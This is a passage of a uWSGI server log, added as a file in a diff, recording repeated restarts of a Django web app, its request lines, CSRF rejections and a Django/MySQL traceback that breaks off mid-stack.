+[pid: 9577|app: -1|req: -1/3] 122.96.42.165 () {38 vars in 700 bytes} [Wed Feb  5 03:20:10 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9576|app: -1|req: -1/4] 122.96.42.165 () {38 vars in 644 bytes} [Wed Feb  5 03:20:11 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9578|app: -1|req: -1/5] 122.96.42.165 () {38 vars in 702 bytes} [Wed Feb  5 03:20:45 2020] GET /login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9576|app: -1|req: -1/6] 122.96.42.165 () {38 vars in 645 bytes} [Wed Feb  5 03:20:46 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9576|app: -1|req: -1/7] 122.96.42.165 () {40 vars in 734 bytes} [Wed Feb  5 03:25:33 2020] GET /login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9577|app: -1|req: -1/8] 122.96.42.165 () {42 vars in 699 bytes} [Wed Feb  5 03:25:33 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9575|app: -1|req: -1/9] 122.96.42.165 () {40 vars in 734 bytes} [Wed Feb  5 03:25:35 2020] GET /login/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9578|app: -1|req: -1/10] 122.96.42.165 () {42 vars in 699 bytes} [Wed Feb  5 03:25:35 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9576|app: -1|req: -1/11] 122.96.42.165 () {38 vars in 646 bytes} [Wed Feb  5 03:25:56 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9576|app: -1|req: -1/12] 127.0.0.1 () {28 vars in 305 bytes} [Wed Feb  5 03:27:05 2020] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9576|app: -1|req: -1/13] 122.96.42.165 () {38 vars in 701 bytes} [Wed Feb  5 03:30:47 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9577|app: -1|req: -1/14] 122.96.42.165 () {38 vars in 645 bytes} [Wed Feb  5 03:30:48 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+gateway "uWSGI http 1" has been buried (pid: 9579)
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 03:38:39 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8888 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:38177 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Python main interpreter initialized at 0x10ee0f0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+Traceback (most recent call last):
+  File "big_data_web/wsgi.py", line 12, in <module>
+    from django.core.wsgi import get_wsgi_application
+ImportError: No module named 'django'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9658)
+spawned uWSGI worker 1 (pid: 9659, cores: 2)
+spawned uWSGI worker 2 (pid: 9660, cores: 2)
+spawned uWSGI worker 3 (pid: 9661, cores: 2)
+spawned uWSGI worker 4 (pid: 9662, cores: 2)
+spawned uWSGI http 1 (pid: 9663)
+--- no python application found, check your startup logs for errors ---
+[pid: 9662|app: -1|req: -1/1] 122.96.42.165 () {40 vars in 732 bytes} [Wed Feb  5 03:38:45 2020] GET /hello => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 9661|app: -1|req: -1/2] 122.96.42.165 () {42 vars in 698 bytes} [Wed Feb  5 03:38:46 2020] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+gateway "uWSGI http 1" has been buried (pid: 9663)
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 03:42:07 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenvs/big_data/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8888 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:34023 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Python main interpreter initialized at 0x1baf220
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1baf220 pid: 9730 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9730)
+spawned uWSGI worker 1 (pid: 9732, cores: 2)
+spawned uWSGI worker 2 (pid: 9733, cores: 2)
+spawned uWSGI worker 3 (pid: 9734, cores: 2)
+spawned uWSGI worker 4 (pid: 9735, cores: 2)
+spawned uWSGI http 1 (pid: 9736)
+[pid: 9734|app: 0|req: 1/1] 122.96.42.165 () {40 vars in 732 bytes} [Wed Feb  5 03:42:13 2020] GET /hello => generated 0 bytes in 8 msecs (HTTP/1.1 301) 3 headers in 112 bytes (1 switches on core 0)
+[pid: 9734|app: 0|req: 2/2] 122.96.42.165 () {40 vars in 734 bytes} [Wed Feb  5 03:42:13 2020] GET /hello/ => generated 5 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 107 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 9732|app: 0|req: 1/3] 122.96.42.165 () {38 vars in 646 bytes} [Wed Feb  5 03:42:14 2020] GET /favicon.ico => generated 3109 bytes in 17 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 9732|app: 0|req: 2/4] 47.101.152.164 () {30 vars in 417 bytes} [Wed Feb  5 03:44:32 2020] GET / => generated 0 bytes in 7 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 9732|app: 0|req: 3/5] 47.101.152.164 () {30 vars in 429 bytes} [Wed Feb  5 03:44:32 2020] GET /login/ => generated 1121 bytes in 14 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 9732|app: 0|req: 4/6] 122.96.42.165 () {40 vars in 734 bytes} [Wed Feb  5 03:46:01 2020] GET /hello/ => generated 5 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 107 bytes (1 switches on core 1)
+SIGINT/SIGQUIT received...killing workers...
+gateway "uWSGI http 1" has been buried (pid: 9736)
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 03:46:22 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8888 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:38271 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Set PythonHome to /root/.virtualenvs/big_data
+Python main interpreter initialized at 0xf872a0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0xf872a0 pid: 9777 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9777)
+spawned uWSGI worker 1 (pid: 9779, cores: 2)
+spawned uWSGI worker 2 (pid: 9780, cores: 2)
+spawned uWSGI worker 3 (pid: 9781, cores: 2)
+spawned uWSGI worker 4 (pid: 9782, cores: 2)
+spawned uWSGI http 1 (pid: 9783)
+[pid: 9782|app: 0|req: 1/1] 122.96.42.165 () {40 vars in 733 bytes} [Wed Feb  5 03:46:25 2020] GET /hello/ => generated 5 bytes in 11 msecs (HTTP/1.1 200) 3 headers in 107 bytes (1 switches on core 0)
+[pid: 9782|app: 0|req: 2/2] 122.96.42.165 () {38 vars in 706 bytes} [Wed Feb  5 03:46:35 2020] GET /register => generated 0 bytes in 2 msecs (HTTP/1.1 301) 3 headers in 115 bytes (1 switches on core 1)
+[pid: 9781|app: 0|req: 1/3] 122.96.42.165 () {38 vars in 708 bytes} [Wed Feb  5 03:46:35 2020] GET /register/ => generated 1369 bytes in 28 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+Not Found: /static/Front_End/reg/css/reg.css
+Not Found: /static/Front_End/reg/js/reg.js
+[pid: 9781|app: 0|req: 2/4] 122.96.42.165 () {38 vars in 669 bytes} [Wed Feb  5 03:46:35 2020] GET /static/Front_End/reg/css/reg.css => generated 3172 bytes in 20 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
+[pid: 9782|app: 0|req: 3/5] 122.96.42.165 () {38 vars in 650 bytes} [Wed Feb  5 03:46:35 2020] GET /static/Front_End/reg/js/reg.js => generated 3166 bytes in 23 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
+Not Found: /static/node_modules/jquery/dist/jquery.slim.js
+[pid: 9780|app: 0|req: 2/6] 122.96.42.165 () {38 vars in 682 bytes} [Wed Feb  5 03:46:35 2020] GET /static/node_modules/jquery/dist/jquery.slim.js => generated 3214 bytes in 34 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
+Not Found: /static/Front_End/general/css/reg&login.css
+[pid: 9780|app: 0|req: 2/7] 122.96.42.165 () {38 vars in 691 bytes} [Wed Feb  5 03:46:35 2020] GET /static/Front_End/general/css/reg%26login.css => generated 3214 bytes in 36 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+gateway "uWSGI http 1" has been buried (pid: 9783)
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 03:47:15 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8888 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Set PythonHome to /root/.virtualenvs/big_data
+Python main interpreter initialized at 0x19561a0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x19561a0 pid: 9792 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9792)
+spawned uWSGI worker 1 (pid: 9794, cores: 2)
+spawned uWSGI worker 2 (pid: 9795, cores: 2)
+spawned uWSGI worker 3 (pid: 9796, cores: 2)
+spawned uWSGI worker 4 (pid: 9797, cores: 2)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 9794|app: 0|req: 1/1] 122.96.42.165 () {42 vars in 739 bytes} [Wed Feb  5 03:48:07 2020] GET /register/ => generated 1369 bytes in 28 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 9794|app: 0|req: 2/2] 122.96.42.165 () {42 vars in 674 bytes} [Wed Feb  5 03:48:18 2020] GET /favicon.ico => generated 3104 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 1)
+[pid: 9794|app: 0|req: 3/3] 122.96.42.165 () {44 vars in 778 bytes} [Wed Feb  5 03:48:24 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 9795|app: 0|req: 1/4] 122.96.42.165 () {44 vars in 781 bytes} [Wed Feb  5 03:49:07 2020] GET /register/ => generated 1369 bytes in 30 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+Forbidden (CSRF cookie not set.): /register/
+[pid: 9797|app: 0|req: 1/5] 122.96.42.165 () {52 vars in 964 bytes} [Wed Feb  5 03:49:29 2020] POST /register/ => generated 2837 bytes in 24 msecs (HTTP/1.1 403) 3 headers in 102 bytes (1 switches on core 0)
+Forbidden (CSRF cookie not set.): /register/
+[pid: 9795|app: 0|req: 2/6] 122.96.42.165 () {52 vars in 964 bytes} [Wed Feb  5 03:51:04 2020] POST /register/ => generated 2837 bytes in 4 msecs (HTTP/1.1 403) 3 headers in 102 bytes (1 switches on core 1)
+Forbidden (CSRF cookie not set.): /register/
+[pid: 9797|app: 0|req: 2/7] 122.96.42.165 () {52 vars in 964 bytes} [Wed Feb  5 03:51:40 2020] POST /register/ => generated 2837 bytes in 4 msecs (HTTP/1.1 403) 3 headers in 102 bytes (1 switches on core 1)
+[pid: 9794|app: 0|req: 4/8] 122.96.42.165 () {42 vars in 729 bytes} [Wed Feb  5 03:52:03 2020] GET /main => generated 0 bytes in 1 msecs (HTTP/1.1 301) 3 headers in 111 bytes (1 switches on core 0)
+[pid: 9795|app: 0|req: 3/9] 122.96.42.165 () {42 vars in 731 bytes} [Wed Feb  5 03:52:03 2020] GET /main/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 9795|app: 0|req: 4/10] 122.96.42.165 () {42 vars in 733 bytes} [Wed Feb  5 03:52:03 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+Forbidden (CSRF cookie not set.): /login/
+[pid: 9797|app: 0|req: 3/11] 122.96.42.165 () {52 vars in 955 bytes} [Wed Feb  5 03:52:20 2020] POST /login/ => generated 2837 bytes in 2 msecs (HTTP/1.1 403) 3 headers in 102 bytes (1 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+*** Starting uWSGI 2.0.18 (64bit) on [Wed Feb  5 04:04:37 2020] ***
+compiled with version: 5.4.0 20160609 on 04 February 2020 17:08:01
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7842
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8888 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Set PythonHome to /root/.virtualenvs/big_data
+Python main interpreter initialized at 0xc0a1a0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xc0a1a0 pid: 9945 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 9945)
+spawned uWSGI worker 1 (pid: 9947, cores: 2)
+spawned uWSGI worker 2 (pid: 9948, cores: 2)
+spawned uWSGI worker 3 (pid: 9949, cores: 2)
+spawned uWSGI worker 4 (pid: 9950, cores: 2)
+[pid: 9948|app: 0|req: 1/1] 122.96.42.165 () {44 vars in 752 bytes} [Wed Feb  5 04:04:45 2020] GET / => generated 0 bytes in 17 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 9948|app: 0|req: 2/2] 122.96.42.165 () {44 vars in 764 bytes} [Wed Feb  5 04:04:45 2020] GET /login/ => generated 1121 bytes in 16 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 9947|app: 0|req: 1/3] 122.96.42.165 () {42 vars in 671 bytes} [Wed Feb  5 04:04:46 2020] GET /favicon.ico => generated 3104 bytes in 15 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Internal Server Error: /login/
+Traceback (most recent call last):
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./main/views.py", line 40, in login
+    if user.exists():
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/query.py", line 766, in exists
+    return self.query.has_results(using=self.db)
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/sql/query.py", line 522, in has_results
+    return compiler.has_results()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/sql/compiler.py", line 1103, in has_results
+    return bool(self.execute_sql(SINGLE))
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/sql/compiler.py", line 1131, in execute_sql
+    cursor = self.connection.cursor()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 256, in cursor
+    return self._cursor()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 233, in _cursor
+    self.ensure_connection()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 217, in ensure_connection
+    self.connect()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 197, in connect
+    self.init_connection_state()
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/mysql/base.py", line 231, in init_connection_state
+    if self.features.is_sql_auto_is_null_enabled:
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/utils/functional.py", line 80, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/mysql/features.py", line 82, in is_sql_auto_is_null_enabled
+    cursor.execute('SELECT @@SQL_AUTO_IS_NULL')
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/utils.py", line 103, in execute
+    sql = self.db.ops.last_executed_query(self.cursor, sql, params)
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/mysql/operations.py", line 146, in last_executed_query
+    query = query.decode(errors='replace')
+AttributeError: 'str' object has no attribute 'decode'
+[pid: 9947|app: 0|req: 2/4] 122.96.42.165 () {52 vars in 955 bytes} [Wed Feb  5 04:05:27 2020] POST /login/ => generated 116185 bytes in 137 msecs (HTTP/1.1 500) 4 headers in 130 bytes (1 switches on core 1)
+Traceback (most recent call last):
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/base.py", line 115, in _get_response
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/base.py", line 113, in _get_response
+  File "./main/views.py", line 40, in login
+    if user.exists():
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/query.py", line 766, in exists
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/sql/query.py", line 522, in has_results
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/sql/compiler.py", line 1103, in has_results
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/models/sql/compiler.py", line 1131, in execute_sql
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 256, in cursor
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 233, in _cursor
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 217, in ensure_connection
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/base/base.py", line 197, in connect
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/mysql/base.py", line 231, in init_connection_state
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/utils/functional.py", line 80, in __get__
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/mysql/features.py", line 82, in is_sql_auto_is_null_enabled
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/utils.py", line 103, in execute
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/db/backends/mysql/operations.py", line 146, in last_executed_query
+AttributeError: 'str' object has no attribute 'decode'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/utils/deprecation.py", line 94, in __call__
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 36, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 90, in response_for_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 125, in handle_uncaught_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 94, in technical_500_response
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/debug.py", line 331, in get_traceback_html
+  File "/usr/lib/python3.5/pathlib.py", line 1151, in open
+    opener=self._opener)
+  File "/usr/lib/python3.5/pathlib.py", line 1005, in _opener
+    return self._accessor.open(self, flags, mode)
+  File "/usr/lib/python3.5/pathlib.py", line 371, in wrapped
+    return strfunc(str(pathobj), *args)
+FileNotFoundError: [Errno 2] No such file or directory: '/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/views/templates/technical_500.html'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 34, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/utils/deprecation.py", line 94, in __call__
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 36, in inner
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 90, in response_for_exception
+  File "/root/.virtualenvs/big_data/lib/python3.5/site-packages/django/core/handlers/exception.py", line 125, in handle_uncaught_exception
